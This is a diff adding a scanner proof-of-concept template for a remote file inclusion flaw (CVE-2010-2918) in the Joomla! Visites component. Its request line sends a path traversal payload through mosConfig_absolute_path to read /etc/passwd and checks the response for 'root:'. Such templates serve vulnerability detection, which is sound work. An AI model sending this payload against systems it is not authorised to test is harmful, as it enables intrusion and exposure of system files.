@@ -1,0 +1,21 @@
+[info]
+id = "POC-AVE-2010-0101"
+name = "Joomla! Component Visites 1.1 RC2 - Remote File Inclusion PoC"
+author = "ave"
+severity = "high"
+description = "检测 Joomla! Visites 组件 1.1 RC2 的 core/include/myMailer.class.php 远程文件包含漏洞。通过 mosConfig_absolute_path 参数传入路径遍历载荷读取 /etc/passwd，验证漏洞存在。"
+vuln_id = ["CVE-2010-2918", "AVE-2010-0101"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+protocol = "http"
+method = "GET"
+path = "{{BaseURL}}/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd"
+
+[[poc.requests.matchers]]
+type = "word"
+words = ["root:"]
+part = "body"
+expect = true
